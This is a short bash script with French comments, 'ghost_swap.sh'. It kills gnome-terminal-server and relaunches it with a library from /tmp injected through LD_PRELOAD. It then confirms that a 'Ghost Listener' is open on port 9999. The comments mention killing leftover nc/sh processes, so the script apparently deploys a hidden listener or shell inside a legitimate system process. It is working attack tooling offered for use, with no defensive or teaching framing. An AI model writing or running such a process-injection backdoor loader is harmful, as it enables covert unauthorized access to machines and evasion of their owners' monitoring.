#!/bin/bash
# ghost_swap.sh - Version Chirurgicale

LIB="/tmp/libghost.so"
TARGET_BIN="/usr/libexec/gnome-terminal-server"

echo "[*] Injection sur gnome-terminal-server..."

if [ ! -f "$LIB" ]; then
    echo "[!] Erreur : $LIB est introuvable. Compile-le d'abord."
    exit 1
fi

# 1. Nettoyage radical des résidus de tes tests précédents
# On tue les anciens gvfsd et les instances de nc/sh qui tournent à 99% CPU
pkill -9 -u $USER -f "gvfsd" 2>/dev/null
pkill -9 -u $USER -f "9999" 2>/dev/null

# 2. On tue le serveur de terminal actuel (tes fenêtres vont se fermer)
killall -9 gnome-terminal-server 2>/dev/null

# 3. Lancement avec injection
# On utilise &! (Zsh) ou & disown (Bash) pour détacher totalement le processus
LD_PRELOAD="$LIB" nohup "$TARGET_BIN" >/dev/null 2>&1 &!

echo "[+] Instance relancée. Attente du port 9999..."
sleep 2

if ss -ltpn | grep -q ":9999"; then
    echo "[OK] Ghost Listener actif."
    ss -ltpn | grep ":9999"
else
    echo "[FAIL] Le port 9999 est invisible. Vérifie 'is_target_process' dans ghost_lib.c"
fi
